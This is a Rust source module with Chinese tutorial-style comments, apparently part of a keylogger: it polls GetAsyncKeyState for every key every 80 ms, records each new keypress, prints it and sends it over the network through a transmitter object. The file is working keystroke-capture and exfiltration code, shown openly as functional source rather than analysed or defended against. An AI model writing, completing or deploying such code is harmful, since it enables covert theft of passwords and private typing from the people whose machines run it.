// ============================================================================
// Polling 方式键盘监听模块
// ============================================================================
// 本模块实现了使用轮询（Polling）方式来检测键盘输入
// 
// 轮询方式是最简单的键盘检测方法
// 它定期检查每个按键的状态，检测到按键按下就记录
// 
// 工作原理：
// 1. 使用 GetAsyncKeyState 函数获取按键状态
// 2. 比较当前状态和上一次的状态，检测按键变化
// 3. 如果检测到新的按键按下，就记录并发送
// 
// 优点：
// - 实现简单，不需要消息循环
// - 不需要创建窗口
// - 不需要安装钩子
// - CPU 占用低（通过调整轮询间隔）
// 
// 缺点：
// - 可能漏掉快速按键（如果轮询间隔太长）
// - 无法区分按键的来源（无法获取硬件信息）
// ============================================================================

use crate::key_handler::vk_to_string;  // 按键转换函数
use crate::network::NetworkTransmitter;  // 网络传输器
use std::io::Write;     // 用于刷新标准输出
use std::sync::Arc;     // 原子引用计数
use std::thread;        // 线程模块
use std::time::Duration; // 时间间隔

// ============================================================================
// Windows API 函数声明
// ============================================================================

/// 声明 user32.dll 中的 GetAsyncKeyState 函数
/// 
/// GetAsyncKeyState 用于获取指定按键的异步状态
/// 它可以检测按键是否正在被按下，以及自上次调用以来是否被按下过
#[link(name = "user32")]
unsafe extern "system" {
    /// 获取异步按键状态
    /// 
    /// # 参数
    /// * `v_key` - 虚拟键码（0-255）
    /// 
    /// # 返回值
    /// 返回一个 16 位整数，各位的含义：
    /// - 最高位（0x8000）：如果按键当前正在被按下，则设置
    /// - 最低位（0x0001）：如果自上次调用以来按键被按下过，则设置
    /// 
    /// # 示例
    /// ```
    /// let state = GetAsyncKeyState(VK_SPACE);
    /// let is_pressed = (state as u16 & 0x8000) != 0;
    /// ```
    pub fn GetAsyncKeyState(v_key: i32) -> i16;
}

// ============================================================================
// 全局变量
// ============================================================================

/// 网络传输器的全局引用
static mut NETWORK_TRANSMITTER: Option<Arc<NetworkTransmitter>> = None;

/// 按键状态数组
/// 
/// 记录每个按键在上一次轮询时的状态
/// true = 按下，false = 释放
/// 
/// 数组索引对应虚拟键码（0-255）
/// 我们只检查 8-255，因为 0-7 没有对应的按键
static mut KEY_STATES: [bool; 256] = [false; 256];

/// 设置网络传输器
/// 
/// 在主函数中调用，将网络传输器保存到全局变量
/// 
/// # 参数
/// * `transmitter` - 网络传输器的 Arc 引用
pub unsafe fn set_network_transmitter(transmitter: Arc<NetworkTransmitter>) {
    unsafe {
        NETWORK_TRANSMITTER = Some(transmitter);
    }
}

/// 轮询检测按键
/// 
/// 这是 Polling 方式的核心函数
/// 它会无限循环，定期检查所有按键的状态
/// 
/// # 工作流程
/// 1. 遍历所有虚拟键码（8-255）
/// 2. 调用 GetAsyncKeyState 获取当前状态
/// 3. 与上一次的状态比较，检测新的按键按下
/// 4. 如果检测到新按键，转换为字符串并发送
/// 5. 更新按键状态数组
/// 6. 等待一段时间后重复
/// 
/// # 性能优化
/// 轮询间隔设为 80ms，这是因为：
/// - 人类最快的按键速度大约是每秒 10-15 次
/// - 80ms 的间隔足够捕获所有按键
/// - 不会占用太多 CPU 资源
pub unsafe fn poll_keys() {
    // 轮询间隔：80ms
    // 这个值经过测试，既能捕获所有按键，又不会占用太多 CPU
    // 人类最快的按键速度也不会超过 80ms 一次
    let poll_interval = Duration::from_millis(80);

    // 主循环
    loop {
        // 遍历所有虚拟键码（8-255）
        // 虚拟键码 0-7 没有对应的按键，所以从 8 开始
        for vk_code in 8..=255 {
            // 获取当前按键状态
            // GetAsyncKeyState 返回一个 i16
            let state = unsafe { GetAsyncKeyState(vk_code) };
            
            // 检查最高位（0x8000）判断按键是否正在被按下
            // state as u16 将 i16 转换为 u16，避免负数问题
            let is_pressed = (state as u16 & 0x8000) != 0;

            // 检测新的按键按下事件
            // 条件：当前按下 且 上一次没有按下
            if is_pressed && unsafe { !KEY_STATES[vk_code as usize] } {
                // 将虚拟键码转换为可读字符串
                let key_str = vk_to_string(vk_code as u32, true);

                // 输出到控制台
                print!("{}", key_str);
                std::io::stdout().flush().unwrap();

                // 通过网络发送按键数据
                // 使用 &raw const 获取原始指针，避免引用问题
                let transmitter_ptr = unsafe { &raw const NETWORK_TRANSMITTER };
                if let Some(transmitter) = unsafe { &*transmitter_ptr } {
                    if let Err(e) = transmitter.send(&key_str) {
                        eprintln!("网络发送失败：{}", e);
                    }
                }
            }

            // 更新按键状态数组
            unsafe {
                KEY_STATES[vk_code as usize] = is_pressed;
            }
        }

        // 等待一段时间再进行下一次轮询
        // 这样可以降低 CPU 占用
        thread::sleep(poll_interval);
    }
}
